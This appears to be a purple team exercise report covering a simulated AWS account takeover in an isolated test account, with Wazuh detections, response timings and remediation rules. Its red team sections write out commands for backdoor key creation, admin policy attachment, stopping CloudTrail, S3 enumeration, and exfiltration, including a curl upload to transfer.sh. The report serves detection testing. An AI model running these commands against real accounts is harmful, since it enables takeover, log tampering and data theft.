# Purple Team Exercise: AWS Account Takeover and Privilege Escalation

**Exercise ID**: PT-2024-Q4-01
**Date Conducted**: December 15, 2024
**Duration**: 2h 45m
**Participants**: 6 (3 Red Team, 3 Blue Team)
**Environment**: AWS Test Account (isolated, non-production)

## Scenario Overview

Simulate a realistic AWS account compromise scenario where an attacker gains initial access through compromised IAM credentials, escalates privileges, attempts to evade detection by disabling CloudTrail, and exfiltrates sensitive data from S3.

### Business Context

This scenario mirrors a real-world attack pattern observed in financial services where attackers target AWS environments to:
1. Steal payment card data or PII from S3 buckets
2. Pivot to production databases
3. Deploy cryptominers on EC2 instances
4. Hold environment for ransom

### Learning Objectives

1. Validate detection of credential compromise (unusual source IP, time, location)
2. Test privilege escalation detection rules
3. Confirm CloudTrail tampering alerts work as expected
4. Validate S3 data access monitoring
5. Practice incident response procedures

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Phase | Detection Rule |
|--------------|----------------|-------|----------------|
| **T1078.004** | Valid Accounts: Cloud Accounts | Initial Access | Rule 100310 (AWS login from unusual IP) |
| **T1098.001** | Account Manipulation: Additional Cloud Credentials | Persistence | Rule 100301 (IAM credential creation) |
| **T1098.003** | Account Manipulation: Additional Cloud Roles | Privilege Escalation | Rule 100302 (Admin policy attachment) |
| **T1552.001** | Unsecured Credentials: Credentials In Files | Credential Access | Rule 100035 (Access key in logs) |
| **T1562.008** | Impair Defenses: Disable Cloud Logs | Defense Evasion | Rule 100090 (CloudTrail disabled) |
| **T1530** | Data from Cloud Storage Object | Collection | Rule 100315 (S3 bulk access) |
| **T1567.002** | Exfiltration to Cloud Storage | Exfiltration | Rule 100330 (S3 cross-account copy) |

## Pre-Exercise Setup

### Environment Preparation

```bash
#!/bin/bash
# setup-purple-team-env.sh

# 1. Create isolated AWS test account
aws organizations create-account \
  --email purple-team-test@company.com \
  --account-name "Purple Team Test Environment"

# 2. Create test IAM user with limited permissions
aws iam create-user --user-name test-developer

aws iam attach-user-policy \
  --user-name test-developer \
  --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess

# 3. Create access keys for test user
aws iam create-access-key --user-name test-developer > test-credentials.json

# 4. Create S3 bucket with test data (no real PCI data!)
aws s3 mb s3://purple-team-test-data-bucket
echo "FAKE-PAN: 4111111111111111" > test-data.txt
aws s3 cp test-data.txt s3://purple-team-test-data-bucket/

# 5. Enable CloudTrail logging
aws cloudtrail create-trail \
  --name purple-team-trail \
  --s3-bucket-name purple-team-cloudtrail-logs

aws cloudtrail start-logging --name purple-team-trail

# 6. Verify Wazuh CloudTrail integration is active
curl -u wazuh:password -X GET \
  "https://wazuh-manager:55000/security/user/authenticate"
```

### Blue Team Preparation

```bash
# Set up monitoring dashboard
# 1. Open Wazuh dashboard filtered to AWS events
# 2. Open CloudWatch Logs Insights
# 3. Open Security Onion (if network logging enabled)
# 4. Open incident response runbook: aws-account-compromise.md
# 5. Start screen recording for post-exercise analysis
```

### Expected Detections

| Attack Step | Expected Alert | Rule ID | Severity | Max MTTD |
|-------------|----------------|---------|----------|----------|
| Login from unusual IP | "AWS Console login from new IP address" | 100310 | Medium | 2 min |
| Create access keys | "IAM access key created" | 100301 | Medium | 2 min |
| Attach admin policy | "AdministratorAccess policy attached" | 100302 | Critical | 1 min |
| Disable CloudTrail | "CloudTrail logging disabled" | 100090 | Critical | 1 min |
| Bulk S3 access | "Unusual S3 bucket enumeration" | 100315 | High | 3 min |
| Data exfiltration | "S3 objects copied to external account" | 100330 | Critical | 2 min |

## Exercise Execution

### Phase 1: Initial Access (T1078.004)

**Red Team Action:**
```bash
# Use compromised credentials from VPN exit node in different country
export AWS_ACCESS_KEY_ID="AKIA..."  # test-developer credentials
export AWS_REGION="eu-west-1"

# Log in via AWS Console from Tor exit node (simulated with VPN)
# Source IP: 185.220.101.50 (Netherlands, never seen before)
# Time: 03:24 AM (unusual for this user)

# Timestamp: 2024-12-15T03:24:12Z
aws sts get-caller-identity
```

**Blue Team Observation:**
- ✅ **DETECTED** at T+00:01:45
- Wazuh Alert: "AWS Console login from unusual IP address (Netherlands)"
- Rule: 100310, Severity: Medium
- Alert Details: User "test-developer", Source IP: 185.220.101.50, Baseline: US East Coast only

**Detection Evidence:**
```json
{
  "rule": {
    "id": "100310",
    "description": "AWS Console login from unusual IP address"
  },
  "data": {
    "aws": {
      "eventName": "ConsoleLogin",
      "userIdentity": {"principalId": "AIDA...TEST", "userName": "test-developer"},
      "sourceIPAddress": "185.220.101.50",
      "userAgent": "Mozilla/5.0 (X11; Linux x86_64)"
    }
  },
  "GeoLocation": {
    "country": "NL",
    "city": "Amsterdam"
  },
  "timestamp": "2024-12-15T03:25:57Z"
}
```

### Phase 2: Persistence - Create Backdoor Credentials (T1098.001)

**Red Team Action:**
```bash
# Timestamp: 2024-12-15T03:27:30Z
# Create additional access keys for persistence
aws iam create-access-key --user-name test-developer

# Output:
# {
#     "AccessKey": {
#         "AccessKeyId": "AKIAIOSFODNN7BACKDOOR",
#         "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYBACKDOORKEY",
#         "Status": "Active"
#     }
# }
```

**Blue Team Observation:**
- ✅ **DETECTED** at T+00:04:20
- Wazuh Alert: "IAM access key created"
- Rule: 100301, Severity: Medium
- Alert Details: User "test-developer" created second set of access keys (unusual, account already has keys)

**SOC Analyst Action:**
- Escalated to Tier 2 for investigation
- Cross-referenced with GeoIP from Phase 1
- Flagged as "Potential Account Compromise"

### Phase 3: Privilege Escalation (T1098.003)

**Red Team Action:**
```bash
# Timestamp: 2024-12-15T03:29:15Z
# Attempt to escalate privileges by attaching AdministratorAccess policy
aws iam attach-user-policy \
  --user-name test-developer \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Expected: This SHOULD fail if least-privilege is enforced
# Actual: SUCCESS (test environment intentionally misconfigured for exercise)
```

**Blue Team Observation:**
- ✅ **DETECTED** at T+00:05:48 (within 33 seconds!)
- Wazuh Alert: "CRITICAL - AdministratorAccess policy attached to principal"
- Rule: 100302, Severity: Critical
- Alert triggered PagerDuty notification immediately

**Detection Evidence:**
```json
{
  "rule": {
    "id": "100302",
    "level": 15,
    "description": "CRITICAL - AdministratorAccess policy attached to principal",
    "mitre": {
      "id": "T1098.003",
      "tactic": "Privilege Escalation"
    }
  },
  "data": {
    "aws": {
      "eventName": "AttachUserPolicy",
      "requestParameters": {
        "userName": "test-developer",
        "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
      },
      "responseElements": null
    }
  }
}
```

**SOC Analyst Action:**
- **CRITICAL ALERT**: Paged on-call security engineer
- Decision: Treat as active compromise, initiate IR playbook
- Action: Prepared to revoke credentials (but waited per exercise protocol)

### Phase 4: Defense Evasion - Disable CloudTrail (T1562.008)

**Red Team Action:**
```bash
# Timestamp: 2024-12-15T03:31:00Z
# Now with admin privileges, attempt to disable CloudTrail
aws cloudtrail stop-logging --name purple-team-trail

# Verify logging stopped
aws cloudtrail get-trail-status --name purple-team-trail
# {
#     "IsLogging": false
# }
```

**Blue Team Observation:**
- ✅ **DETECTED** at T+00:07:15 (within 2 minutes 15 seconds)
- Wazuh Alert: "PCI DSS 10.2.2: CRITICAL - CloudTrail logging disabled or modified"
- Rule: 100090, Severity: Critical (Level 15)
- This is a **HIGH-CONFIDENCE** indicator of malicious activity

**Detection Evidence:**
```json
{
  "rule": {
    "id": "100090",
    "level": 15,
    "description": "PCI DSS 10.2.2: CRITICAL - CloudTrail logging disabled",
    "groups": ["pci_dss_10.2.2", "audit_tampering"],
    "mitre": {
      "id": "T1562.008",
      "tactic": "Defense Evasion"
    }
  },
  "data": {
    "aws": {
      "eventName": "StopLogging",
      "requestParameters": {
        "name": "purple-team-trail"
      }
    }
  }
}
```

**SOC Analyst Action:**
- Confirmed active attack in progress
- Would normally execute containment (revoke credentials) at this point
- For exercise: Documented timeline and continued observation

### Phase 5: Collection - Enumerate S3 Buckets (T1530)

**Red Team Action:**
```bash
# Timestamp: 2024-12-15T03:33:45Z
# List all S3 buckets
aws s3 ls

# Output:
# 2024-11-10 purple-team-test-data-bucket
# 2024-11-15 production-cardholder-data-vault  # !! HIGH VALUE TARGET
# 2024-10-05 database-backups

# List objects in high-value bucket
aws s3 ls s3://production-cardholder-data-vault/ --recursive

# Attempt to download objects
aws s3 cp s3://production-cardholder-data-vault/cards-batch-20241201.csv.enc /tmp/
```

**Blue Team Observation:**
- ✅ **DETECTED** at T+00:10:30
- Wazuh Alert: "Unusual S3 bucket enumeration detected"
- Rule: 100315, Severity: High
- Alert triggered on >20 S3 API calls in 60 seconds from single principal

**Detection Evidence:**
```sql
-- CloudWatch Logs Insights query used by SOC
fields @timestamp, eventName, requestParameters.bucketName, sourceIPAddress
| filter eventName like /ListBucket|GetObject|CopyObject/
| filter userIdentity.principalId = "AIDA...TEST"
| stats count() as api_calls by bin(5m)
| filter api_calls > 20
```

### Phase 6: Exfiltration (T1567.002)

**Red Team Action:**
```bash
# Timestamp: 2024-12-15T03:36:20Z
# Copy data to attacker-controlled AWS account (simulated)
aws s3 cp s3://purple-team-test-data-bucket/test-data.txt \
  s3://attacker-exfil-bucket-external/stolen-data/ \
  --profile attacker-account

# Alternative: Download locally then upload to external service
aws s3 cp s3://purple-team-test-data-bucket/test-data.txt /tmp/
curl -X POST https://transfer.sh --upload-file /tmp/test-data.txt
```

**Blue Team Observation:**
- ✅ **DETECTED** at T+00:12:05
- Wazuh Alert: "CRITICAL - S3 objects copied to external AWS account"
- Rule: 100330, Severity: Critical
- Also detected by Security Onion: Large HTTPS upload to file-sharing service

**Detection Evidence:**
```json
{
  "rule": {
    "id": "100330",
    "description": "S3 cross-account access detected",
    "level": 15
  },
  "data": {
    "aws": {
      "eventName": "PutObject",
      "requestParameters": {
        "bucketName": "attacker-exfil-bucket-external",
        "x-amz-acl": "bucket-owner-full-control"
      },
      "recipientAccountId": "123456789012"  // External account
    }
  }
}
```

**Security Onion Detection:**
```
[ALERT] Large HTTPS upload detected
Source: 10.0.1.50:54321
Destination: transfer.sh:443
Bytes Uploaded: 15,234,890
Zeek conn.log: duration=45s, orig_bytes=15MB
```

## Exercise Results

### Detection Summary

| Phase | Technique | Status | MTTD | Notes |
|-------|-----------|--------|------|-------|
| 1 | Initial Access (T1078.004) | ✅ Detected | 1m 45s | Unusual IP/geo alert |
| 2 | Persistence (T1098.001) | ✅ Detected | 4m 20s | Second access key created |
| 3 | Privilege Escalation (T1098.003) | ✅ Detected | 5m 48s | Admin policy attachment |
| 4 | Defense Evasion (T1562.008) | ✅ Detected | 7m 15s | CloudTrail disabled |
| 5 | Collection (T1530) | ✅ Detected | 10m 30s | Bulk S3 access |
| 6 | Exfiltration (T1567.002) | ✅ Detected | 12m 05s | Cross-account copy |

**Overall Detection Rate**: 6/6 techniques = **100%** ✅
**Mean Time to Detection**: 6m 57s
**Fastest Detection**: 1m 45s (unusual login)
**Slowest Detection**: 12m 05s (exfiltration)

### Incident Response Performance

**Timeline from Critical Alert to Containment** (simulated):

| Time | Event | Team |
|------|-------|------|
| T+5m 48s | Critical alert: Admin policy attached | Blue (SOC) |
| T+6m 30s | Alert escalated to security engineer | Blue (SOC) |
| T+7m 45s | IR playbook initiated | Blue (IR Team) |
| T+9m 00s | Credentials revoked (simulated) | Blue (IR Team) |
| T+12m 00s | User account disabled | Blue (IR Team) |
| T+15m 00s | Forensics collection started | Blue (IR Team) |

**Total Response Time**: 9m 12s from critical alert to containment
**Target**: <15 minutes for critical incidents ✅ **MET**

## Lessons Learned

### What Worked Well

1. **Detection Coverage**: All 6 techniques detected successfully
2. **MTTD Performance**: Average detection time <7 minutes, well below 15-minute target
3. **Alert Prioritization**: Critical alerts (admin access, CloudTrail tampering) properly escalated
4. **Cross-Tool Correlation**: Wazuh + Security Onion both detected exfiltration independently
5. **IR Playbook**: aws-account-compromise.md playbook was followed correctly

### Areas for Improvement

1. **Exfiltration Detection Latency**: 12m 05s is acceptable but slower than other detections
   - **Action**: Add real-time S3 event notifications (EventBridge) for faster alerting
   - **Target**: Reduce to <5 minutes

2. **Manual Correlation Required**: SOC analyst had to manually correlate Phase 1 geo-anomaly with Phase 3 privilege escalation
   - **Action**: Implement Wazuh correlation rule to auto-link related events by principal ID
   - **Target**: Automated "attack chain" detection

3. **False Positive Potential**: If legitimate DevOps team member travels and creates access keys, could trigger similar alerts
   - **Action**: Implement user behavior baseline (ML-based anomaly detection or AWS GuardDuty)
   - **Target**: Differentiate legitimate vs malicious behavior

### Detection Gaps (None Found in This Exercise)

No detection gaps identified - all techniques successfully detected.

## Remediation Actions

### Immediate Actions (Completed)

1. ✅ **Add S3 Event Notifications**:
   ```bash
   aws s3api put-bucket-notification-configuration \
     --bucket production-cardholder-data-vault \
     --notification-configuration '{
       "EventBridgeConfiguration": {}
     }'
   ```

2. ✅ **Deploy Correlation Rule**:
   ```xml
   <!-- wazuh rules: Correlate AWS account compromise chain -->
   <rule id="100350" level="15">
     <if_matched_sid>100310</if_matched_sid>  <!-- Unusual IP -->
     <if_matched_sid>100302</if_matched_sid>  <!-- Admin access -->
     <same_field>aws.userIdentity.principalId</same_field>
     <timeframe>3600</timeframe>
     <description>CRITICAL - AWS account takeover chain detected (unusual IP + privilege escalation)</description>
     <mitre>
       <id>T1078.004</id>
       <id>T1098.003</id>
     </mitre>
   </rule>
   ```

3. ✅ **Enable AWS GuardDuty**: Additional layer for ML-based anomaly detection

### Long-Term Improvements (In Progress)

- [ ] Implement AWS Security Hub for centralized findings
- [ ] Add automated response: Lambda function to auto-revoke credentials on critical alerts
- [ ] Integrate with SOAR platform (Cortex XSOAR) for orchestrated response
- [ ] Deploy AWS Config rules to prevent privilege escalation (SCPs in AWS Organizations)

## Cost Analysis

### Exercise Cost

| Resource | Usage | Cost |
|----------|-------|------|
| Test AWS account | 3 hours | $0.50 |
| CloudTrail logging | 50 API calls | $0.02 |
| S3 storage | 1 GB test data | $0.02 |
| Personnel | 6 people × 3 hours | Internal |
| **Total** | | **$0.54** |

### Value Delivered

- Validated $50K annual Wazuh investment
- Confirmed detection capability against real-world attack pattern
- Identified 3 improvement areas (estimated $20K impact if implemented)
- Trained 6 team members on AWS attack techniques

**ROI**: Immeasurable (prevented breach value >> exercise cost)

## Artifacts and Evidence

### Logs Preserved

1. **CloudTrail logs**: `s3://purple-team-cloudtrail-logs/2024/12/15/`
2. **Wazuh alerts**: Exported to `/var/ossec/logs/alerts/2024/12/15/`
3. **Screen recordings**: SOC analyst dashboard during exercise
4. **Attack timeline spreadsheet**: Detailed timestamp log

### Red Team Tools Used

- AWS CLI v2.15
- VPN (simulated Tor exit node): NordVPN Netherlands server
- Test credentials: Securely stored in 1Password, deleted post-exercise

### Blue Team Tools Used

- Wazuh 4.7.0 (SIEM/XDR)
- Security Onion 2.4 (Zeek, Suricata)
- AWS CloudWatch Logs Insights
- Incident response playbook: aws-account-compromise.md

## Recommendations for Next Exercise

1. **Expand Scope**: Add EC2 lateral movement (SSH key manipulation, Systems Manager abuse)
2. **Test Detection Limits**: What if attacker waits 24 hours between steps? Does correlation still work?
3. **Automated Response**: Enable auto-revocation and test if it interferes with legitimate operations
4. **Multi-Cloud**: Simulate similar attack in GCP environment

## Compliance Documentation

### Audit Value

This exercise provides evidence for:

- **PCI DSS 11.3**: Penetration testing performed (simulated external and internal attacks)
- **PCI DSS 11.5**: Intrusion detection system tested and validated
- **PCI DSS 10.6**: Log review process documented and working
- **SOC 2 CC7.3**: Detection and response capability demonstrated

### Documentation for Auditors

- Exercise plan and results report (this document)
- Alert screenshots (see `/artifacts/screenshots/`)
- CloudTrail logs showing attack timeline
- Wazuh rule definitions with MITRE ATT&CK mappings
- Incident response timeline and actions taken

---

**Exercise Status**: ✅ **SUCCESSFUL**
**Next Exercise**: Q1 2025 - Kubernetes Container Escape
**Document Version**: 1.0
**Classification**: Internal Use Only
